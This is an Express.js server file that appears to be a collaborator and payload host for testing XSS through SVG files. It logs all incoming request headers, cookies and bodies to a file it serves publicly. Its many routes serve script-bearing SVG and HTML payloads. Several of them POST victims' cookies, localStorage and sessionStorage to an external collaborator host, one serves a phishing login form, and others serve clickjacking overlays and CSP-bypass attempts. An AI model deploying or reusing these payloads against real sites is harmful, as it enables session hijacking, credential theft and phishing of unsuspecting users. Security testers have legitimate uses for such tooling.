const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Middleware to capture every incoming request
app.use((req, res, next) => {
  const logEntry = {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.originalUrl,
    domain: req.headers.host,
    headers: req.headers,
    cookies: req.cookies,
    ip: req.ip,
    body: req.body
  };

  
   const headers = {
    'X-Content-Type-Options': 'nosniff',
    'Access-Control-Allow-Headers': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, PUT',
     'Access-Control-Allow-Origin': 'null',
     'Access-Control-Allow-Credentials': 'true',
    'Content-Security-Policy': [
      "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
      "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
      "style-src * 'unsafe-inline' data:",
      "img-src * data: blob:",
      "object-src *",
      "connect-src *",
      "frame-src *",
      "frame-ancestors *",
      "form-action *",
      "base-uri *",
      "sandbox allow-same-origin allow-popups allow-scripts allow-popups-to-escape-sandbox allow-top-navigation allow-forms",
    ].join('; ')
  };

  // Set headers
  res.set(headers);

  // Log the request data to a file
  const logFilePath = path.join(__dirname, 'request_logs.txt');
  const logText = `\n${logEntry.timestamp} - ${logEntry.method} ${logEntry.url} - Domain: ${logEntry.domain} - IP: ${logEntry.ip} - Body: ${JSON.stringify(logEntry.body)} - Headers: ${JSON.stringify(logEntry.headers)} - Cookies: ${JSON.stringify(logEntry.cookies)}\n`;

  // Append the log entry to the file
  fs.appendFile(logFilePath, logText, (err) => {
    if (err) {
      console.error('Error writing log:', err);
    }
  });

  // Continue to the next middleware or route handler
  next();
});

app.get("/dynamic", (req, res) => {
    // Extract query parameters
    const queryParams = req.query;

   const headers = {
    'X-Content-Type-Options': 'nosniff',
    'Access-Control-Allow-Headers': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, PUT',
     'Access-Control-Allow-Origin': 'null',
     'Access-Control-Allow-Credentials': 'true',
    'Content-Security-Policy': [
      "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
      "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
      "style-src * 'unsafe-inline' data:",
      "img-src * data: blob:",
      "object-src *",
      "connect-src *",
      "frame-src *",
      "frame-ancestors *",
      "form-action *",
      "base-uri *",
      "sandbox allow-same-origin allow-popups allow-scripts allow-popups-to-escape-sandbox allow-top-navigation allow-forms",
    ].join('; ')
  };

  // Set headers
  res.set(headers);

    // Extract and set headers from query parameters
    Object.keys(queryParams).forEach((key) => {
        if (key.startsWith("header-")) {
            const headerName = key.replace("header-", "") // header-Content-Type => Content-Type
            res.setHeader(headerName, queryParams[key]); // res.setHeader("Content-type", queryParams["header-Content-Type"])
        }
    });

    // Extract the response status code, default to 200
    const statusCode = parseInt(queryParams["response-statuscode"]) || 200;

    // Extract response data
    const data = queryParams["data"] || "";

   res.setHeader('X-Content-Type-Options', 'nosniff')

    // Send the response with the provided status code
    res.status(statusCode).send(data);
});

app.get('/not-image.jpg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
    <img src="" tag="hi there" />
  `);
});

app.get('/load-url/:url', (req, res) => {
  const url = req.params.url;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.status(200).send(`
    
       <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
            <foreignObject width="100" height="100">
                <body xmlns="http://www.w3.org/1999/xhtml">
                    <input id="blue" src="https://${url}" sandbox="allow-popups" type="image"/>
                    <a href="https://google.com">google</a>
                </body>
            </foreignObject>
        </svg>

  `)
  
})

app.get('/image0.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
  <svg xmlns="http://www.w3.org/2000/svg">
      <h1>hi there</h1>
      </svg>
      <script>
        alert("This is a script in an SVG!");
      </script>
      <img src=x onerror=alert(1) />
      <script>
        alert("This is a script in an SVG!");
      />
  </svg>`);
});

app.get('/image1.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`<svg xmlns="http://www.w3.org/2000/svg">
  
  
  <script>
    alert("This is a script in an SVG!");
  </script>
  
  
</svg>`);
});

app.get('/image-h.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`<svg xmlns="http://www.w3.org/2000/svg">
  <metadata>
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval';">
  </meta>
  </metadata>
  <script>
    alert('Injected Script Executed!');
  </script>
</svg>`);
});

app.get('/image-inject-dom.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      alert('aymen el kani');
    });
  </script>
</svg>`);
});

app.get('/image2.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`<object type="image/svg+xml" data="https://kani-collaborator.onrender.com/image1.svg"></object>`);
});

app.get('/image3.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`<svg xmlns="http://www.w3.org/2000/svg" onclick="alert('SVG clicked!')">
  <rect width="100" height="100" fill="red"></rect>
</svg>`);
});

app.get('/image4.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`<svg xmlns="http://www.w3.org/2000/svg" >
  <script src="alertwebsite.ct.ws/payload.js" />
</svg>`);
});

app.get('/auth.svg', (req, res) => {
  res.setHeader('WWW-Authenticate', 'Basic realm="Staging server", charset="UTF-8"')
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send('hi')
  
})

app.get('/image_onload_att.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
    <svg xmlns="http://www.w3.org/2000/svg" onload="
      fetch('https://kani-collaborator.onrender.com/exfil', {
        method: 'POST',
        body: document.cookie,
        headers: {'Content-Type': 'application/json'}
      });
    ">
      <circle cx="50" cy="50" r="50" fill="blue"></circle>
    </svg>
  `);
});

app.get('/image_escape.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send("<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//");
});

app.get('/image-IMG-tag.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'text/html');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`<img src="X" onerror="alert(1)" />`);
});

app.get('/redirect.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Location', 'https://google.com')
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.status(302).send(`redirecting..`);
});

app.get('/embed-svg.svg', (req, res) => {
  // Headers for bypassing ORB
  const headers = {
    'Content-Type': 'image/svg+xml', // Proper content type for SVG
    'Access-Control-Allow-Origin': '*', // Enable cross-origin access
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': '*',
    'X-Content-Type-Options': 'nosniff', // Prevent MIME sniffing
    'Content-Security-Policy': [
      "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
      "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
      "style-src * 'unsafe-inline' data:",
      "img-src * data: blob:",
      "object-src *",
      "connect-src *",
      "frame-src *",
      "frame-ancestors *",
      "form-action *",
      "base-uri *",
      "sandbox allow-same-origin allow-popups allow-scripts allow-popups-to-escape-sandbox allow-top-navigation allow-forms",
    ].join('; ')
  };

  res.set(headers);

  // Return SVG embedding malicious HTML or JS via <foreignObject>
  res.status(200).send(`
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <foreignObject width="100" height="100">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <script>
                    // Example: Stealing cookies or sessionStorage
                    fetch('https://kani-collaborator.onrender.com/stolen-data', {
                        method: 'POST',
                        body: JSON.stringify({
                            cookies: document.cookie,
                            localStorage: JSON.stringify(localStorage),
                            sessionStorage: JSON.stringify(sessionStorage)
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                </script>
                <h1>Malicious Code Executing...</h1>
            </body>
        </foreignObject>
    </svg>
  `);
});


app.get('/embed-any.svg', (req, res) => {
  // Organize headers into a single object for readability
  const headers = {
    'X-Content-Type-Options': 'nosniff',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, PUT',
    'Content-Security-Policy': [
      "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
      "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
      "style-src * 'unsafe-inline' data:",
      "img-src * data: blob:",
      "object-src *",
      "connect-src *",
      "frame-src *",
      "frame-ancestors *",
      "form-action *",
      "base-uri *",
      "sandbox allow-same-origin allow-popups allow-scripts allow-popups-to-escape-sandbox allow-top-navigation allow-forms",
    ].join('; ')
  };

  // Set headers
  res.set(headers);

  // Malicious HTML content embedded in an iframe
  res.status(200).send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Malicious Embed</title>
    </head>
    <body>
        <iframe srcdoc="
          <!DOCTYPE html>
          <html>
          <head>
              <script>
                  // Example malicious JavaScript
                  fetch('https://kani-collaborator.onrender.com/stolen-data', {
                      method: 'POST',
                      body: JSON.stringify({
                          cookies: document.cookie,
                          localStorage: JSON.stringify(localStorage),
                          sessionStorage: JSON.stringify(sessionStorage)
                      }),
                      headers: { 'Content-Type': 'application/json' }
                  });
              </script>
          </head>
          <body>
              <h1>Malicious Code Executing...</h1>
          </body>
          </html>
        " style="width:100%; height:100%; border:none;"></iframe>
    </body>
    </html>
  `);
});

app.get('/image-a-tag.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
    <svg xmlns="http://www.w3.org/2000/svg">
      <a href="javascript:alert('SVG Click!');">
        <rect width="100" height="100" style="fill: red;"></rect>
      </a>
    </svg>
  `);
});

app.get('/image-external-src.svg', (req, res) => {
  // Serve JavaScript instead of an image
   res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
    <svg xmlns="http://www.w3.org/2000/svg">      
        <image href="https://kani-collaborator.onrender.com/?data=stolen_data" onerror="alert('XSS')" />
    </svg>
  `);
});

app.get('/image-csp-dom-inject.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
    <svg xmlns="http://www.w3.org/2000/svg">
      <script>
        const script = document.createElement('script');
        script.src = 'data:text/javascript,alert("SVG Bypass!")';
        document.body.appendChild(script);
      </script>
    </svg>
  `);
});

app.get('/image-postmessage.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
    <svg xmlns="http://www.w3.org/2000/svg">
      <script>
        window.parent.postMessage('<script>alert("Bypass via PostMessage!")</script>', '*');
      </script>
    </svg>
  `);
});


app.get('/image-clickjacking.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
   <svg xmlns="http://www.w3.org/2000/svg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;">
    <rect width="100%" height="100%" fill="transparent" onclick="alert('Clickjacked!')" />
  </svg>
  `);
});

app.get('/image-html-form.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
   <svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="100" height="50">
        <div xmlns="http://www.w3.org/1999/xhtml">
          <form action="https://kani-collaborator.onrender.com/phish" method="POST">
            <label>Username:</label><input type="text" name="username" />
            <label>Password:</label><input type="password" name="password" />
            <button type="submit">Log In</button>
          </form>
        </div>
      </foreignObject>
    </svg>
  `);
});

app.get('/image-href.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
   <svg xmlns="http://www.w3.org/2000/svg">
      <image href="javascript:alert('CSP bypass');" />
    </svg>
  `);
});

app.get('/image-data.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
   <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzdHJvbmcgb25sb2FkPSJhbGVydCgnTWFsaWNpb3VzIEV4cGVyaWVuY2UnKTsgYWxlcnQoJ0V4cGVyaWVuY2UnKTsgYWxlcnQoIlNob3cgdXAgYXBwbGllY2F0aW9uISIpOyIgfC8+PC9zdHJvbmc+PC9zdmc+Cg==" />
  `);
});


app.get('/image-object-svg.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
    <svg xmlns="http://www.w3.org/2000/svg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;">
      <rect width="100%" height="100%" fill="transparent" onclick="alert('Clickjacked!')" />
      <object type="image/svg+xml" data="https://kani-collaborator.onrender.com/image1.svg"></object>
      <object onload=alert(1) type="image/svg+xml" data="https://kani-collaborator.onrender.com/image1.svg"></object>
    </svg>
  `);
});

app.get('/image-error-handler.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
   <svg xmlns="http://www.w3.org/2000/svg">
      <script>
        try {
          alert('Payload executed!');
        } catch (e) {
          console.log("hello there, aymen el kani")
          fetch('https://your-logger.com/?error=' + e.message);
        }
      </script>
    </svg>
  `);
});

app.get('/image-double-encode.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
   <svg xmlns="http://www.w3.org/2000/svg">
      <script>eval(unescape('%61%6c%65%72%74%28%27%48%65%6c%6c%6f%27%29'));</script>
    </svg>
  `);
});

app.get('/image-embed.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
      <embed src="https://kani-collaborator.onrender.com/image1.svg" type="image/svg+xml" width="500" height="500">
  `);
});

app.get('/image-embed-in-svg.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
   <svg xmlns="http://www.w3.org/2000/svg">
      <embed src="https://kani-collaborator.onrender.com/image1.svg" type="image/svg+xml" width="500" height="500">
    </svg>
  `);
});

app.get('/image-xml.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
  res.send(`
  <?xml version="1.0" standalone="no"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS executed!')">
    <text x="10" y="20">This is a test</text>
  </svg>
  `);
});



// Serve the request_logs.txt file as a static file (accessible at /logs/request_logs.txt)
app.use('/logs', express.static(path.join(__dirname, '/')));

// Catch-all route to handle any subdomain and log the request
app.get('*', (req, res) => {
  res.status(404).send('Subdomain not found, but the request has been logged.');
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
